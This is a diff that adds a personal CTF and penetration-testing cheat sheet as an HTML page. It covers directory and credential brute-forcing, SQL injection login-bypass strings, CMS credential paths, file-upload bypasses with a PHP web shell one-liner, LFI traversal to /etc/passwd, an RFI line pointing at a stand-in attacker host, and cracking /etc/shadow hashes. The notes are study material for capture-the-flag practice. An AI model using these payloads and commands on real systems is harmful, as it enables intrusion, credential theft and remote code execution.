+                    <code class="lang-shell">ffuf -w <span class="hljs-tag">&lt;<span class="hljs-name">wordlist</span>&gt;</span> -u <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>/FUZZ
+                    </code>
+                    <li><a href="https://www.kali.org/tools/dirb/" title="https://www.kali.org/tools/dirb/">dirb</a></li>
+                    <code class="lang-shell">dirb <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">wordlist</span>&gt;</span>
+                    </code>
+                    <li><a href="https://www.kali.org/tools/dirbuster/" title="https://www.kali.org/tools/dirbuster/">dirbuster</a></li>
+                    <code class="lang-shell"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span><span class="hljs-keyword">DirBuster-1.0-RC1.jar </span>-u &lt;url&gt;
+                    </code>
+                    <li><a href="https://www.kali.org/tools/gobuster/" title="https://www.kali.org/tools/gobuster/">gobuster</a></li>
+                    <code class="lang-shell">gobuster -u <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span> -w <span class="hljs-tag">&lt;<span class="hljs-name">wordlist</span>&gt;</span> dir
+                    </code>
+                    <li><a href="https://www.kali.org/tools/nikto/" title="https://www.kali.org/tools/nikto/">nikto</a></li>
+                    <code class="lang-shell">nikto -h <span class="hljs-tag">&lt;<span class="hljs-name">hostname</span>&gt;</span> –output <span class="hljs-tag">&lt;<span class="hljs-name">filename</span>&gt;</span>
+                    </code>
+                </ul>
+                <h3 id="bruteforce-subdomain">Bruteforce subdomain</h3>
+                <h3 id="bruteforce-credentials">Bruteforce credentials</h3>
+                <ul>
+                    <li><a href="https://www.kali.org/tools/wfuzz/" title="https://www.kali.org/tools/wfuzz/">wfuzz</a></li>
+                    <code class="lang-shell">wfuzz -w <span class="hljs-params">&lt;wordlist&gt;</span> -L <span class="hljs-number">20</span> -d <span class="hljs-string">"username=FUZZ&amp;password=FUZZ"</span> -hw <span class="hljs-number">1224</span> <span class="hljs-params">&lt;url&gt;</span> page path
+                    </code>
+                    <li><a href="https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/attack-types" title="https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/attack-types">BurpSuite — sniper/cluster bomb</a></li>
+                </ul>
+                <h3 id="sql-injection">SQL Injection</h3>
+                <ul>
+                    <li><a href="https://www.kali.org/tools/sqlmap/" title="https://www.kali.org/tools/sqlmap/">sqlmap</a></li>
+                    <code class="lang-shell"> sqlmap -u &lt;url&gt; <span class="hljs-comment">--dbs</span>
+                    </code>
+                    <li>Enum using nmap</li>
+                    <code> <span class="hljs-keyword">nmap</span> -sV --script=http-sql-injection <span class="hljs-symbol">&lt;target&gt;</span>
+                    </code>
+                    <li>Using jsql</li>
+                    <li>Capture the request using burp suite, and save the request in a file.</li>
+                    <li><code>sqlmap -r request.txt</code></li>
+                    <li>Crawl a page to find sql-injections</li>
+                    <code> sqlmap -u <span class="hljs-string">http:</span><span class="hljs-comment">//example.com --crawl=1</span>
+                    </code>
+                    <li><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</a></li>
+                    <li>Login bypass</li>
+                    <ul>
+                        <li> <code>‘or 1=1- -</code></li>
+                        <li> <code>‘ or ‘1’=1</code></li>
+                        <li> <code>‘ or ‘1’=1 - -</code></li>
+                        <li> <code>‘–</code></li>
+                        <li> <code>&#39; or &#39;1&#39;=&#39;1</code></li>
+                        <li> <code>-&#39;</code></li>
+                        <li> <code>&#39; &#39;</code></li>
+                        <li> <code>&#39;&amp;&#39;</code></li>
+                        <li> <code>&#39;^&#39;</code></li>
+                        <li> <code>&#39;*&#39;</code></li>
+                        <li> <code>&#39; or &#39;&#39;-&#39;</code></li>
+                        <li> <code>&#39; or &#39;&#39; &#39;</code></li>
+                        <li> <code>&#39; or &#39;&#39;&amp;&#39;</code></li>
+                        <li> `&#39; or &#39;&#39;^&#39;``</li>
+                        <li> `&#39; or &#39;&#39;*&#39;</li>
+                        <li> <code>&quot;-&quot;</code></li>
+                        <li> <code>&quot; &quot;</code></li>
+                        <li> <code>&quot;&amp;&quot;</code></li>
+                        <li> <code>&quot;^&quot;</code></li>
+                        <li> <code>&quot;*&quot;</code></li>
+                        <li> <code>&quot; or &quot;&quot;-&quot;</code></li>
+                        <li> <code>&quot; or &quot;&quot; &quot;</code></li>
+                        <li> <code>&quot; or &quot;&quot;&amp;&quot;</code></li>
+                        <li> <code>&quot; or &quot;&quot;^&quot;</code></li>
+                        <li> <code>&quot; or &quot;&quot;*&quot;</code></li>
+                        <li> <code>or true--</code></li>
+                        <li> <code>&quot; or true--</code></li>
+                        <li> <code>&#39; or true--</code></li>
+                        <li> <code>&quot;) or true--</code></li>
+                        <li> <code>&#39;) or true--</code></li>
+                        <li> <code>&#39; or &#39;x&#39;=&#39;x</code></li>
+                        <li> <code>&#39;) or (&#39;x&#39;)=(&#39;x</code></li>
+                        <li> <code>&#39;)) or ((&#39;x&#39;))=((&#39;x</code></li>
+                        <li> <code>&quot; or &quot;x&quot;=&quot;x</code></li>
+                        <li> <code>&quot;) or (&quot;x&quot;)=(&quot;x</code></li>
+                        <li> <code>&quot;)) or ((&quot;x&quot;))=((&quot;x</code></li>
+                        <li>known Username:</li>
+                        <ul>
+                            <li> <code>admin’ - -</code></li>
+                            <li> <code>admin’) - -</code></li>
+                        </ul>
+                    </ul>
+                    <li>Using error-bases DB enumeration</li>
+                    <ul>
+                        <li>Add the tick <code>&#39;</code></li>
+                        <li>Enumerate columns</li>
+                    </ul>
+                    <li>Using order by: <a href="https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html">https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html</a></li>
+                </ul>
+                <h3 id="xml-external-entity-xxe-">XML External Entity (XXE)</h3>
+                <h3 id="url-vulnerability">URL vulnerability</h3>
+                <h3 id="os-command-injection">OS command Injection</h3>
+                <h3 id="directory-traversal">Directory traversal</h3>
+                <h3 id="dotdotpwn-tool">Dotdotpwn tool</h3>
+                <h3 id="looking-for-">Looking for:</h3>
+                <ul>
+                    <li>.git</li>
+                    <li>robots.txt</li>
+                </ul>
+                <h3 id="set-extension">Set extension</h3>
+                <ul>
+                    <li>sh, txt, php, html, htm, asp, aspx, js, xml, log, json, jpg, jpeg, png, gif, doc, pdf, mpg, mp3, zip, tar.gz, tar</li>
+                </ul>
+                <h3 id="if-https">If https</h3>
+                <ul>
+                    <li>scan for heartbleed</li>
+                    <code class="lang-shell"> sslscan <span class="hljs-tag">&lt;<span class="hljs-name">hostname:port</span>&gt;</span>
+                    </code>
+                    <code class="lang-shell"> <span class="hljs-keyword">nmap</span> -sV --script=ssl-heartbleed <span class="hljs-symbol">&lt;hostname&gt;</span>
+                    </code>
+                    <li>Read the certificate</li>
+                </ul>
+                <h3 id="if-it-s-a-cms">If it&#39;s a CMS</h3>
+                <ul>
+                    <li>Admin page</li>
+                    <ul>
+                        <li>Joomla</li>
+                        <ul>
+                            <li>/administrator</li>
+                        </ul>
+                        <li>Wordpress</li>
+                        <ul>
+                            <li>/wp-admin</li>
+                            <li>/wp-login</li>
+                        </ul>
+                    </ul>
+                    <li>Wordpress</li>
+                    <ul>
+                        <li><a href="https://www.kali.org/tools/wpscan/" title="https://www.kali.org/tools/wpscan/">wpscan</a></li>
+                        <code class="lang-shell"><span class="hljs-comment">wpscan</span> <span class="hljs-literal">-</span><span class="hljs-comment">u</span> &lt;<span class="hljs-comment">url</span>&gt; <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">enumerate</span> <span class="hljs-literal">-</span><span class="hljs-comment">t</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">enumerate</span> <span class="hljs-comment">u</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">enumerate</span> <span class="hljs-comment">p</span>
+                        </code>
+                        <code class="lang-shell">wpscan –u <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span> --username <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> --wordlist <span class="hljs-tag">&lt;<span class="hljs-name">wordlist</span>&gt;</span>
+                        </code>
+                        <code class="lang-shell">wpscan -u &lt;url&gt; --<span class="hljs-built_in">random</span>-<span class="hljs-built_in">agent</span>
+                        </code>
+                    </ul>
+                    <li>Drupal</li>
+                    <ul>
+                        <li><a href="https://github.com/SamJoan/droopescan" title="https://github.com/SamJoan/droopescan">droopescan</a></li>
+                        <li><code>/CHANGELOG.txt</code> to find version</li>
+                    </ul>
+                    <li>Adobe Cold Fusion</li>
+                    <ul>
+                        <li><code>/CFIDE/adminapi/base.cfc?wsdl</code></li>
+                        <li><code>exploit/windows/http/coldfusion_fckeditor</code></li>
+                        <li>LFI: <code>http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</code></li>
+                    </ul>
+                    <li>Elastix</li>
+                    <ul>
+                        <li>default login are <code>admin:admin</code> at <code>/vtigercrm/</code></li>
+                        <li>able to upload shell in profile-photo</li>
+                        <li>Examine <code>httpd.conf/</code> windows config files</li>
+                    </ul>
+                    <li>JBoss</li>
+                    <ul>
+                        <li>JMX Console <code>http://IP:8080/jmxconcole/</code></li>
+                        <li>War File</li>
+                    </ul>
+                    <li>Joomla</li>
+                    <ul>
+                        <li>configuration.php</li>
+                        <li>diagnostics.php</li>
+                        <li>joomla.inc.php</li>
+                        <li>config.inc.php</li>
+                    </ul>
+                    <li>Mambo</li>
+                    <ul>
+                        <li>configuration.php </li>
+                        <li>config.inc.php</li>
+                    </ul>
+                    <li>Wordpress</li>
+                    <ul>
+                        <li>setup-config.php </li>
+                        <li>wp-config.php</li>
+                    </ul>
+                    <li>ZyXel</li>
+                    <ul>
+                        <li>/WAN.html (contains PPPoE ISP password)</li>
+                        <li>/WLAN_General.html and /WLAN.html (contains WEP key)</li>
+                        <li>/rpDyDNS.html (contains DDNS credentials)</li>
+                        <li>/Firewall_DefPolicy.html (Firewall)</li>
+                        <li>/CF_Keyword.html (Content Filter)</li>
+                        <li>/RemMagWWW.html (Remote MGMT)</li>
+                        <li>/rpSysAdmin.html (System)</li>
+                        <li>/LAN_IP.html (LAN)</li>
+                        <li>/NAT_General.html (NAT)</li>
+                        <li>/ViewLog.html (Logs)</li>
+                        <li>/rpFWUpload.html (Tools</li>
+                        <li>/DiagGeneral.html (Diagnostic)</li>
+                        <li>/RemMagSNMP.html (SNMP Passwords)</li>
+                        <li>/LAN_ClientList.html (Current DHCP Leases)</li>
+                        <li>/RestoreCfg.html</li>
+                        <li>/BackupCfg.html</li>
+                    </ul>
+                </ul>
+                <h3 id="upload-page">Upload page</h3>
+                <ul>
+                    <li>Upload shell to make reverse shell</li>
+                    <li>Bypass file upload filtering</li>
+                    <li>Rename it</li>
+                    <ul>
+                        <li><code>shell.php.jpg</code></li>
+                    </ul>
+                    <li>Blacklisting bypass, change extension</li>
+                    <ul>
+                        <li>php .phtml, .php, .php3, .php4, .php5, and .inc</li>
+                        <li>bypassed by uploading an unpopular php extensions such as: pht, phpt, phtml, php3, php4, php5, php6</li>
+                        <li>asp .asp, .aspx</li>
+                        <li>perl .pl, .pm, .cgi, .lib</li>
+                        <li>jsp .jsp, .jspx, .jsw, .jsv, and .jspf</li>
+                        <li>Coldfusion .cfm, .cfml, .cfc, .dbm</li>
+                    </ul>
+                    <li>Whitelisting bypass</li>
+                    <ul>
+                        <li><code>file.php%00.png</code></li>
+                        <li><code>shell.jpg.php</code></li>
+                        <li>If they check the content. Basically you just add the text &quot;GIF89a;&quot; before you shell-code. <code>&lt;? system($_GET[&#39;cmd&#39;]);//or you can insert your complete shellcode ?&gt;</code></li>
+                        <li>In image</li>
+                        <ul>
+                            <li><code>exiftool -Comment=&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#39;cmd&#39;]); ?&gt;&#39; lo.jpg</code></li>
+                            <li><code>mv lo.jpg lo.php.jpg</code></li>
+                        </ul>
+                    </ul>
+                </ul>
+                <h3 id="phpmyadmin">Phpmyadmin</h3>
+                <ul>
+                    <li>Default login <code>root:pma</code></li>
+                </ul>
+                <h3 id="identify-waf-using-wafw00f-">Identify WAF using <code>wafw00f</code></h3>
+                <h3 id="exploitation">Exploitation</h3>
+                <ul>
+                    <li>Heartbleed exploit</li>
+                    <ul>
+                        <code><span class="hljs-keyword">use</span> auxiliary/scanner/ssl/openssl_heartbleed
+                            <span class="hljs-keyword">set</span> RHOSTS <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.212</span>
+                            <span class="hljs-keyword">set</span> verbose <span class="hljs-literal">true</span>
+                            run
+                        </code>
+                    </ul>
+                    <li>XXS</li>
+                    <ul>
+                        <li>Session hijacking / Cookie theft. Steal cookie to get admin privilege</li>
+                        <li>use xsser tool</li>
+                    </ul>
+                    <li>LFI</li>
+                    <ul>
+                        <li>Bypassing php-execution</li>
+                        <ul>
+                            <li><code>http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index</code></li>
+                        </ul>
+                        <li>Bypassing the added .php and other extra file-endings</li>
+                        <ul>
+                            <li><code>http://example.com/page=../../../../../../etc/passwd%00</code></li>
+                            <li><code>http://example.com/page=../../../../../../etc/passwd?</code></li>
+                        </ul>
+                        <li>folder that always exist</li>
+                        <ul>
+                            <li><code>/etc/hosts /etc/resolv.conf</code></li>
+                        </ul>
+                        <li>add %00jpg to end of files</li>
+                        <ul>
+                            <li><code>/etc/passwd%00jpg</code></li>
+                        </ul>
+                        <li>Refer this for more information</li>
+                        <ul>
+                            <li><a href="https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html">https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html</a></li>
+                            <li><a href="https://highon.coffee/blog/lfi-cheat-sheet/">https://highon.coffee/blog/lfi-cheat-sheet/</a></li>
+                        </ul>
+                    </ul>
+                    <li>RFI</li>
+                    <ul>
+                        <li><code>http://exampe.com/index.php?page=http://attackerserver.com/evil.txt</code></li>
+                    </ul>
+                </ul>
+                <h3 id="other">Other</h3>
+                <li><a href="https://www.kali.org/tools/cewl/" title="https://www.kali.org/tools/cewl/">cewl — Creating wordlist from webpage</a></li>
+                <li><a href="https://github.com/RedSiege/EyeWitness" title="https://github.com/RedSiege/EyeWitness">EyeWitness</a> (take screenshots of websites)</li>
+            </section>
+            <section id="section9">
+                <h2 id="pcap-analysis">PCAP analysis</h2>
+                <h3 id="tools">Tools</h3>
+                <ul>
+                    <li>Wireshark</li>
+                    <li>NetworkMiner</li>
+                    <li>Strings</li>
+                    <li>Tshark</li>
+                </ul>
+                <h3 id="checklist">Checklist</h3>
+                <ul>
+                    <li>Understand the packets</li>
+                    <li>Export objects</li>
+                    <li>Protocol hierarchy give you general understanding</li>
+                    <li>Follow TCP streams</li>
+                    <li>Filtering</li>
+                    <li>Search for keyword such as &quot;flag&quot; using Find Packet</li>
+                    <li>Take a look at Info column. Stupid challenge always put the flag letter by letter in different packets.</li>
+                    <li>If challenge about wifi, USB or keyboard thingy, google the past writeup how they solve.</li>
+                </ul>
+                <h3 id="others">Others</h3>
+                <ul>
+                    <li>Convert pcapng to pcap</li>
+                    <code class="lang-shell"> <span class="hljs-selector-tag">tshark</span> <span class="hljs-selector-tag">-F</span> <span class="hljs-selector-tag">pcap</span> <span class="hljs-selector-tag">-r</span> <span class="hljs-selector-tag">file</span><span class="hljs-selector-class">.pcapng</span> <span class="hljs-selector-tag">-w</span> <span class="hljs-selector-tag">newfile</span><span class="hljs-selector-class">.pcap</span>
+                    </code>
+                    <li>Bruteforce WEP password for PCAP</li>
+                    <code class="lang-shell"> <span class="hljs-selector-tag">aircrack-ng</span> <span class="hljs-selector-tag">-b</span> <span class="hljs-selector-tag">XX</span><span class="hljs-selector-pseudo">:XX</span><span class="hljs-selector-pseudo">:XX</span><span class="hljs-selector-pseudo">:XX</span><span class="hljs-selector-pseudo">:89</span><span class="hljs-selector-pseudo">:b3</span> <span class="hljs-selector-tag">-w</span> ../<span class="hljs-selector-tag">rockyou</span><span class="hljs-selector-class">.txt</span> <span class="hljs-selector-tag">target</span><span class="hljs-selector-class">.pcap</span>
+                    </code>
+                    <code> Go to <span class="hljs-keyword">Edit</span> &gt; preference &gt; Protocol &gt; IEEE 802.11 &gt; <span class="hljs-keyword">Edit</span>... button &gt; wpa-<span class="hljs-keyword">pwd</span> password
+                    </code>
+                    <li>USB pcap: <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/usb-keystrokes">https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/usb-keystrokes</a></li>
+                    <li>Reference: <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection">https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection</a></li>
+                </ul>
+            </section>
+            <section id="section10">
+                <h2 id="passwords">Passwords</h2>
+                <ul>
+                    <li><a href="https://www.kali.org/tools/whois/" title="https://www.kali.org/tools/whois/">Create password</a></li>
+                    <code class="lang-shell">mkpasswd -m sha-512 <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORD</span>&gt;</span>
+                    </code>
+                    <code class="lang-shell">openssl passwd -1 -salt <span class="hljs-tag">&lt;<span class="hljs-name">SALT</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORD</span>&gt;</span>
+                    </code>
+                    <li><a href="https://www.kali.org/tools/john/" title="https://www.kali.org/tools/john/">John the Ripper</a></li>
+                    <code class="lang-shell">sudo apt <span class="hljs-keyword">install</span> john
+                    </code>
+                    <code class="lang-shell">cp /etc/passwd passwd<span class="hljs-selector-class">.txt</span> &amp;&amp; cp /etc/shadow shadow<span class="hljs-selector-class">.txt</span>
+
+                        unshadow passwd<span class="hljs-selector-class">.txt</span> shadow<span class="hljs-selector-class">.txt</span> &gt; hash_to_crack<span class="hljs-selector-class">.txt</span>
+
+                        john --wordlist=/usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span> hash_to_crack.txt
+                    </code>
+                    <li><a href="https://www.kali.org/tools/hydra/" title="https://www.kali.org/tools/hydra/">Hydra</a> | <a href="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Hydra.md" title="https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Hydra.md">(Cheatsheet)</a></li>
+                    <code class="lang-shell">sudo apt <span class="hljs-keyword">install</span> hydra
+                    </code>
+                    <code class="lang-shell">hydra -l root -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/m</span>etasploit<span class="hljs-regexp">/unix_passwords.txt -t 6 ssh:/</span><span class="hljs-regexp">/192.168.1.123</span>
+                    </code>
+                </ul>
+            </section>
+            <section id="section11">
+                <h2 id="wordlists">Wordlists</h2>
+                <ul>
+                    <li><a href="https://www.kali.org/tools/wordlists/" title="https://www.kali.org/tools/wordlists/">Wordlists</a></li>
+                    <code class="lang-shell">sudo apt install wordlists
+
+                        gunzip /usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span><span class="hljs-selector-class">.gz</span>
+                    </code>
+                    <li><a href="https://www.kali.org/tools/seclists/" title="https://www.kali.org/tools/seclists/">SecLists</a></li>
+                    <code class="lang-shell">sudo apt <span class="hljs-keyword">install</span> seclists
+                    </code>
+                </ul>
+            </section>
+            <section id="section12">
+                <h2 id="general">General</h2>
+                <ul>
+                    <li><a href="https://www.kali.org/tools/wget/">wget</a></li>
+                    <code class="lang-shell">wget [<span class="hljs-keyword">options</span>] <span class="hljs-symbol">&lt;url&gt;</span>
+                    </code>
+                    <li><a href="https://www.kali.org/tools/curl/">curl</a></li>
+                    <code class="lang-shell">curl [<span class="hljs-keyword">options</span>] <span class="hljs-symbol">&lt;url&gt;</span>
+                    </code>
+                    <li><a href="https://www.kali.org/tools/openssh/">openssh</a></li>
+                    <code class="lang-shell">scp /src/path/ user<span class="hljs-variable">@host</span><span class="hljs-symbol">:/dest/path/</span>
+                    </code>
+                    <code class="lang-shell">scp user<span class="hljs-variable">@host</span><span class="hljs-symbol">:/dest/path/</span> /src/path/
+                    </code>
+                    <li><a href="https://www.python.org/downloads/?ref=">python</a></li>
+                    <code class="lang-shell"><span class="hljs-keyword">python3</span> [<span class="hljs-keyword">options</span>] [-<span class="hljs-keyword">c</span> cmd | -<span class="hljs-keyword">m</span> <span class="hljs-keyword">mod</span> | <span class="hljs-keyword">file</span> | -]
+                    </code>
+                    <code class="lang-shell"><span class="hljs-selector-tag">python3</span> <span class="hljs-selector-tag">-m</span> <span class="hljs-selector-tag">http</span><span class="hljs-selector-class">.server</span> <span class="hljs-selector-attr">[port]</span>
+                    </code>
+                </ul>
+            </section>
+            <section id="section13">
+                <h2 id="crontab">Crontab</h2>
+                <ul>
+                    <li><a href="https://crontab-generator.org/" title="https://crontab-generator.org/">Crontab Generator</a></li>
+                    <li><a href="https://crontab.guru/" title="https://crontab.guru/">Crontab Guru</a></li>
+                    <li><code class="lang-shell">crontab <span class="hljs-_">-e</span></code></li>
+                </ul>
+            </section>
+            <section id="section14">
+                <h2 id="other-cheatsheets">Other cheatsheets</h2>
+                <ul>
+                    <li><a href="https://github.com/Rajchowdhury420/CTF-CheatSheet">https://github.com/Rajchowdhury420/CTF-CheatSheet</a></li>
+                    <li><a href="https://dvd848.github.io/CTFs/CheatSheet.html">https://dvd848.github.io/CTFs/CheatSheet.html</a></li>
+                    <li><a href="https://github.com/JohnHammond/ctf-katana">https://github.com/JohnHammond/ctf-katana</a></li>
+                    <li><a href="https://github.com/apsdehal/aWEsoMe-cTf">https://github.com/apsdehal/aWEsoMe-cTf</a></li>
+                </ul>
+            </section>
+        </article>
+    </main>
+    <footer class="footer">
+        <div class="footerEnd">&copy; 2023 &middot; My website &middot; Created for educational purposes &middot; Serves as a regular platform for taking notes for myself</div>
+    </footer>
+</body>
+
+</html>
